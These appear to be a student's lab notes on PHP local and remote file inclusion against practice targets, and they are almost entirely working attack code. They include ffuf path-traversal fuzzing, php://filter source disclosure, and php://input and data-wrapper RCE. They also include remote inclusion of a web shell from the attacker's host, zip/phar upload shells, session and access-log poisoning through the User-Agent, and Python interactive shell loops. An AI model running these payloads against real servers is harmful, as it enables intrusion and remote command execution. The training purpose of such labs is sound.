# File Inclusion
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://159.65.92.13:31616//index.php?langu  
age=../../../../FUZZ' -fs 2287
```

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://159.65.92.13:31616/FUZZ
```

```
http://159.65.92.13:31616/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://159.65.19.24:31315/index.php?language=php://input&cmd=id" | grep uid
```

```python
import urllib.parse
import subprocess
import re
import sys

ip_port = "142.93.39.44:31013"

payload = urllib.parse.quote_plus(sys.argv[1])
# execute the command

url = f"""curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' """
url += f""""http://{ip_port}/index.php?language=php://input&cmd={payload}\""""

# pipe thepayload to the command
execute = subprocess.Popen(url,
                           shell=True,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE
                           )

out = execute.stdout.read().decode()


# filter the output including the newline

out = re.sub(r'.*<h2>Containers</h2>', '', out, flags=re.DOTALL)
out = re.sub(r'<p class="read-more">.*', '', out, flags=re.DOTALL)
print(out)
```

#### Remote Code Execution

With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

check expect
```
python3 test.py 'cat /etc/php/7.4/apache2/php.ini' | grep expect
```

## RCE by including an url
```php
<?php system($_GET["cmd"]); ?>
```

```python
import urllib.parse
import subprocess
import re
import signal
import readline

# my ip and port
my_ip = "10.10.14.141"
my_port = 4444

# target
ip_port = "10.129.84.174"

# remove shell.php if the program terminate
# def handler(signum, frame):
#     subprocess.Popen("rm shell.php", shell=True)
#     exit(1)
# signal.signal(signal.SIGINT, handler)

# make shell.php
with open("shell.php", "w") as f:
    f.write("""<?php system($_GET["cmd"]); ?>""")

while True:
    inputs = input("$ ")
    # save inputs to buffer
    readline.write_history_file("./history")
    encoded_inputs = urllib.parse.quote_plus(inputs)

    # execute the command

    url = f"""curl -s """
    url += f""""http://{ip_port}/index.php?language=http://{my_ip}:{my_port}/shell.php&cmd={encoded_inputs}\""""
  
    # pipe thepayload to the command
    execute = subprocess.Popen(url,
                               shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE
                               )

    out = execute.stdout.read().decode()


    # filter the output including the newline

    out = re.sub(r'.*<h2>Containers</h2>', '', out, flags=re.DOTALL)
    out = re.sub(r'<br />.*', '', out, flags=re.DOTALL)
    print(out)
```

```sh
find / -name 'flag.txt'
```

`shell.php`
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```url
http://138.68.188.223:30738/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=ls
```

```python
import readline
import urllib.parse
import requests
import re

while True:
    cmd = input('> ')
    readline.add_history(cmd)
    cmd = urllib.parse.quote_plus(cmd)
    url = f"http://138.68.188.223:30738/index.php?"
    url += f"language=zip://./profile_images/shell.jpg%23shell.php&cmd={cmd}"
    out = requests.get(url).text
    out = re.sub(r'.*<h2>Containers</h2>', '', out, flags=re.DOTALL)
    out = re.sub(r'<p class="read-more">.*', '', out, flags=re.DOTALL)
    print(out)
```

---

http://142.93.39.44:32727/index.php?language=/var/lib/php/sessions/sess_0229p5bg3qn6d15np3pqfi07bb

```python
import requests, urllib.parse, re, readline


while True:
    cmd = input("Enter command: ")
    readline.write_history_file("./history")
    cmd = urllib.parse.quote_plus(cmd)
    _sesion = "0229p5bg3qn6d15np3pqfi07bb"
    log_poison = "http://142.93.39.44:32727/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"
    url = f"http://142.93.39.44:32727/index.php?language=/var/lib/php/sessions/sess_{_sesion}&cmd={cmd}"

    cookies = {
        "PHPSESSID": _sesion
    }

    requests.get(log_poison, cookies=cookies)
    r = requests.get(url, cookies=cookies)
    r = re.sub(r'.*<h2>Containers</h2>', '', r.text, flags=re.DOTALL)
    r = re.sub(r'<p class="read-more">.*', '', r, flags=re.DOTALL)
    print(r)

```

---

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://206.189.26.97:31253/index.php\?FUZZ=value -fs 2309
```

```sh
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://157.245.33.77:31947/index.php\?view\=FUZZ -fs 1935
```

---

```sh
find / -name 'php.ini' 2> /dev/null
```

---

```url
php://filter/read=convert.base64-encode/resource=config
```

```
http://157.245.33.77:31466/index.php?page=php://filter/read=convert.base64-encode/resource=index
```

```
http://157.245.33.77:31466/ilf_admin/index.php
```

```
http://157.245.33.77:31466/ilf_admin/index.php?log=../../../../../../../../../../var/log/nginx/access.log
```

```
<?php system($_GET['cmd']); ?>
```

`payload`
```python
import requests

url = f"http://142.93.39.44:30546/ilf_admin/index.php\?log\=../../../../../../../../../../var/log/nginx/access.log"
user_aget = {'User-Agent': "<?php system($_GET['cmd']); ?>"} # harus menggunakan petik 1
requests.get(url, headers=user_aget)
```

```
http://142.93.39.44:30546/ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt
```